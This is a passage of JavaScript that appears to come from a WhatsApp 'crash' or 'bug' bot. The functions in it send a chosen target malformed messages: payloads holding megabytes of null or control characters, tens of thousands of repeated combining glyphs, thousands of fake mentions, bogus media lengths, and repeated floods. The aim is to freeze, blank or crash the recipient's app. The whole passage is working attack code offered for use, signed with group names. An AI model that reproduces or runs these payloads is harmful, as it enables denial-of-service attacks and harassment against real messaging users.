      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await prim.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Primis", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await prim.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await prim.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}

async function ofmCrashSql(target) {
  let cards = [];
 
  for (let p = 0; p < 25; p++) {
    cards.push({ 
      header: {
        title: 'D5 TEAM',
        videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
      fileLength: "1099511627776",
      seconds: 172800,
      mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
      height: 1080,
      width: 1920,
      fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
      directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774428565",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEECBhQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(9999), 
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: `{"title":"${"\u0000".repeat(9000)}","rows":[]}`
          }
        ]
      }
    });
  }

  const PouMsg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32), 
          supportPayload: "{}"
        },
        interactiveMessage: {
          body: {
            text: "Primis Exposed"
          }, 
          carouselMessage: {
            cards: cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`),
           quotedMessage: {
             paymentInviteMessage: {
             serviceType: 3,
              expiryTimestamp: 7205
              }
            },
           remoteJid: "status@broadcast"
           }
        }
      }
    }
  }, {});

  await prim.relayMessage(target, PouMsg.message, {
    messageId: PouMsg.key.id
  }
);

const bokepPou = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/zqqcsp.mp4" } },
    { upload: prim.waUploadToServer }
  );

   const muaniPou = {
      buttons: [
         {
            name: "galaxy_message",
            buttonParamsJson: `{\"flow_cta\":\"${"\u0000".repeat(200000)}\"}`,
            version: 3
         }
      ]
   };
   const PouCrousel = () => ({
      header: {
         ...bokepPou,
         hasMediaAttachment: true
      },
      nativeFlowMessage: {
            ...muaniPou,
      }
   });
   let PouMsg2 = await generateWAMessageFromContent(target,
      proto.Message.fromObject({
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: { text: "Primis Exposed" },
                  carouselMessage: {
                     cards: [
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel()
                     ]
                  },
                  contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`), }
               }
            }
         }
      }),
    {}
   );
   await prim.relayMessage(target, PouMsg2.message, {
      messageId: null
   });
}

// blank 

async function blankv1(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363419474272514@newsletter",
      newsletterName: "D5!Primis¿? X Zep" + "ោ៝".repeat(10000),
      caption: "squichy.json" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999",
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  await prim.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}

async function Abcefghh(target) {
  const PouMsg = {
    viewOnceMessageV2Extension: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          header: {
            title: "D5Primis"
          },
          body: {
            text: "Primis Exposed"
          },
          footer: {
            text: "Primis Offc"
          },
          nativeFlowMessage: {
          messageParamsJson: "{".repeat(8000),
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text:"𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              }
            ]
          }
        }
      }
    }
  }

  await prim.relayMessage(target, PouMsg, {})
}

async function HomoSigmaWing(target) {
  try {
    for (let i = 0; i < 10; i++) {
      const PouMsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          interactiveMessage: {
            header: {
              subtitle: "Primis The Explorer",
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                caption: "Primis The Explorer" + "ꦽ".repeat(5000) + "ꦾ".repeat(5000),
                fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
                fileLength: "71746",
                height: 916,
                width: 720,
                mediaKey: "n5z/W8ANmTT0KmZKPyk13uTpm3eRB4czy0p/orz6LOw=",
                fileEncSha256: "CxcswDicTjs/UHDH1V5DWZh25jk1l0zMLrcTEJyuYMM=",
                directPath: "/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&_nc_hot=1762092861",
                mediaKeyTimestamp: "1762085432",
                jpegThumbnail: Buffer.from(
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAECAwUGAQADAQEAAAAAAAAAAAAAAAAAAQMCBP/aAAwDAQACEAMQAAAA6iK052qv1Jy+R0dVGejPNFJuwypOjdJZNqpvYJpEFIN600nvWlx6lZlU0ialOdtnK86sYN5hktvdnIHRYvcDTEgy2QAsAl//xAAkEAACAgICAgICAwAAAAAAAAABAgADETEEIRIiEBM0YQUyUf/aAAgBAQABPwBuZSh3L+e79VR0dvZjmEfqey9zjfyVlXT9iUciu9coYqgljAF3APKFVA/rAldg7XEsrrBIAlNrce9COgYoKMUh2QJWMACW0ee4qGsAQ1eRIyRLVxdTnWZy8B8jcrBcxHxA4Ilrd/oRyMhhLz9lqINkwkuCTsysYhUKhMUnEwuyRLcf6JR+bXEEB8GhYOpEVfXBn1gDIWW6PrOH+YrHUURDoERqEI6GIQ1Z71PsXG5aylTPAhIPhWyBLATDxwOzFrTHaiXrFx8AwHuMQYTiXEET/8QAGhEAAgMBAQAAAAAAAAAAAAAAAAECICEQEf/aAAgBAgEBPwBts8FgtHj7GkaOv//EABsRAAMAAwEBAAAAAAAAAAAAAAABEQIQICEx/9oACAEDAQE/AIQeOrUhDSMvr0jycUnP/9k=",
                  "base64"
                ),
              },
              hasMediaAttachment: true
            },
            body: {
              text: "Primis The Explorer" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
            },
            footer: {
              text: "Primis The Explorer"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(5000),
              buttons: [
                 {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "Primis The Explorer",
                    flow_message_version: "3"
                  })
                }
              ]
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 1000 }, (_, p) => `1313555000${p + 1}@s.whatsapp.net`),
              isForwarded: true,
              forwardingScore: 999,
              externalAdReply: {
                title: "Primis The Explorer",
                body: "Primis The Explorer",
                thumbnailUrl: "https://img1.pixhost.to/images/9872/657036846_ochobot.jpg",
                sourceUrl: "https://t.me/dsprimis",
                mediaType: 1,
                showAdAttribution: true,
                renderLargerThumbnail: true
              }
            }
          }
        }),
        { userJid: target }
      );

      await prim.relayMessage(target, PouMsg.message, {
        messageId: PouMsg.key.id,
      });
      await new Promise(r => setTimeout(r, 500));
    }

  } catch (crt) {
    console.error("EROR NJIR:", crt);
  }
}

async function xxx(prim, target) { 
  const freez = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦽ".repeat(45000),
      publisher: "TS - TEAM",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "XXX - TEAM ",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  await prim.relayMessage(target, freez, {
    participant: { jid: target }
  });
}

async function HardBukQIM(target) {
    let quotedMessage = {
        key: {
            participant: "13135550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            fromMe: false
        },
        message: {
            interactiveResponseMessage: {
                body: {
                    text: "It's Squichy",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Prim\",\"landmark_area\":\"18\",\"address\":\"P0K3\",\"tower_number\":\"P0k3\",\"city\":\"tobrut\",\"name\":\"p0k3\",\"phone_number\":\"999999999999\",\"house_number\":\"13135550002\",\"floor_number\":\"@3135550202\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }
    };
    for (let p = 0; p < 25; p++) {
        await prim.sendMessage(target, { 
        text: "D5!Primis¿?" + "ꦽ".repeat(3000) 
        },
          { quoted: quotedMessage }
        );
    }
}

async function ofmEr(prim, target) {
  await prim.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "D5?"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: prim.user.id
          },
          body: {
            text: "DsPrimis",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}

async function vfz(target) {
  await prim.relayMessage(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "OnvYb+0Ss+wPFvD8Rl/17+YlXYDRifpw5f+jRE1Gsbg=",
      fileLength: 999999999999999,
      seconds: 999999,
      mediaKey: "RVY9RqvBDcgghvdeedlN5jTK3IsSLsFgqgkzej4e3X4=",
      caption: "િ፷𝑫̶𝒔̈́͟𝑷𝒓̶ᐁ𝑰𝒎̽͢𝒊𝒔𝑺̽፮▾ ༑̴⟆",
      height: 850,
      width: 478,
      fileEncSha256: "5zaKfVhEc73jJhA0A76c8pVmUlm2NnuVc3cnWce7RQc=",
      directPath: "/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&_nc_hot=1772095746",
      mediaKeyTimestamp: "1772015271",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
      processedVideos: [{
        quality: "HIGH",
        capabilities: ["Primis","Tech Squad","Ts'sCorp"]
      }],
      gifAttribution: "GIPHY",
      contextInfo: {
        forwardingScore: 7205,
        isForwarded: true,
        pairedMediaType: "HEVC_VIDEO_CHILD",
        forwardOrigin: "UNKNOWN"
      },
      streamingSidecar: "fAMcYnkzkWykVy5Nr51RhzHwBRVBfXHYi5aR/XpP7X8b50/aNLQOKn6Q2Md1FSI0LOk2QW8sfmBSUdpYoPBeOhPFCeWjIKvK6pt7M5eEhKZYk2laDw3jpHKsW0fhQKTsluCFHJQr6oamjFtRs3MybkhXOMEm9osjbq83MBKgR+DqWqGGvic/xVFX5TvHX7saOSY5iCGVeJXlLU/ZZfxQkZO5zx7F3WVY6Y0oXI7bvz/YyT2hPYXRyKhp6SAgm9El6BvkLeYflYV3tlyzly+uMwJJq2nDUWBJYEc0ARR3F4WqpZnpjQJKTtwXl8sC4yHBS2hQFT1sLighApXV1mYEUNJFL9vNMu+9hvv6Irmd/+E4oAXnKB8mpy1scoBigBKlJYX7PrK58SUbN+qj/+WgwaZGVNeMpED2fR9wR8t5TuvXPJgnnEpwfCas",
      annotations: [
        {
          polygonVertices: [
            {
              x: 0.25,
              y: 0.4155234396457672
            },
            {
              x: 0.75,
              y: 0.4155234396457672
            },
            {
              x: 0.75,
              y: 0.5836874842643738
            },
            {
              x: 0.25,
              y: 0.5836874842643738
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "806119065866333",
              songId: "1137812656623908",
              author: "͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊".repeat(2000),
              title: "͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊".repeat(2000),
              artworkDirectPath: "/v/t61.89441-24/595437186_731840673341902_1266462731933211674_n.enc?ccb=11-4&oh=01_Q5Aa3wGVOUtWMjbELz41CC6Hq7KB65m4UQ1Ok_J4Onvo7RgRZQ&oe=69C77E6D&_nc_sid=5e03e0",
              artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artworkEncSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artistAttribution: "https://t.me/dsprimis",
              countryBlocklist: "UlU=",
              isExplicit: true,
              artworkMediaKey: "",
              musicSongStartTimeInMs: "7000",
              derivedContentStartTimeInMs: "0",
              overlapDurationInMs: "30000"
            }
          },
          embeddedAction: true
        }
      ],
      metadataUrl: "https://mmg.whatsapp.net/channel/video?id=921729444087793"
    }
  }, {
    participant: { jid:target }
  })
}


async function epcihDiley(prim, target) {
    try {
        await prim.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "$",
                            matchedText: "https://t.me/dsprimis",
                            description: "$",
                            title: "$",
                            paymentLinkMetadata: {
                                button: {
                                    displayText: "#",
                                },
                                header: {
                                    headerType: 1,
                                },
                                provider: {
                                    paramsJson: "{{".repeat(120000),
                                },
                            },
                            linkPreviewMetadata: {
                                paymentLinkMetadata: {
                                    button: {
                                        displayText: "@jule",
                                    },
                                    header: {
                                        headerType: 1,
                                    },
                                    provider: {
                                        paramsJson: "{{".repeat(120000),
                                    },
                                },
                                urlMetadata: {
                                    fbExperimentId: 999,
                                },
                                fbExperimentId: 888,
                                linkMediaDuration: 555,
                                socialMediaPostType: 1221,
                                videoContentUrl: "https://wa.me/settings/linked_devices#,,jule",
                                videoContentCaption: "@jule",
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                                quotedMessage: {
                                    locationMessage: {
                                        degreesLatitude: 9.999999919991,
                                        degreesLongitude: -999999999999,
                                        accuracyInMeters: 1
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        let parse = true;
        let SID = "5e03e0";
        let key = "10000000_2203140470115547_947412155165083119_n.enc";
        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const stc = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                        mimetype: type,
                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        }, {});

        const jawir = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "#",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await prim.relayMessage(target, {
            groupStatusMessageV2: {
                message: stc.message,
            },
        }, {
            messageId: stc.key.id,
            participant: { jid: target },
        });

        await prim.relayMessage(target, {
            groupStatusMessageV2: {
                message: jawir.message,
            },
        }, {
            messageId: jawir.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}


async function DelaFreezCloseRelay(prim, target) {
  try {
    const randomJid = `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`;
    const generateMentioned = Array.from({ length: 1900 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    );

    const message = {
      groupInviteMessage: {
        groupJid: "120363370626418572@g.us",
        inviteCode: "Xx".repeat(200),
        inviteExpiration: "99999999999",
        groupName: "</> Squichy Rx" + "ោ៝".repeat(200),
        caption: "ោ៝".repeat(300),
        jpegThumbnail: null,
        contextInfo: {
          participant: target,
          remoteJid: randomJid,
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...generateMentioned
          ],
          groupInviteMessage: {
            inviteCode: "Xx".repeat(200),
            groupJid: "120363370626418572@g.us",
            groupName: "ោ៝".repeat(200),
            inviteExpiration: 99999999999,
            caption: "ោ៝".repeat(300)
          },
          quotedMessage: {
            extendedTextMessage: {
              text: " ~ Squichy Rx",
              contextInfo: {
                mentionedJid: ["13135550002@s.whatsapp.net"],
                externalAdReply: {
                  title: "\u0000".repeat(3000),
                  body: "who i am • @dsprimis",
                  thumbnailUrl: "",
                  mediaType: 1,
                  sourceUrl: `https://xnxx.com/${"ꦾ".repeat(3000)}`,
                  showAdAttribution: false
                }
              }
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500)
            }
          }
        }
      },
      extendedTextMessage: {
        text: '.',
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "olaa" + " ꦾ".repeat(50)
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: 'CHAT_SETTING'
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const listMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
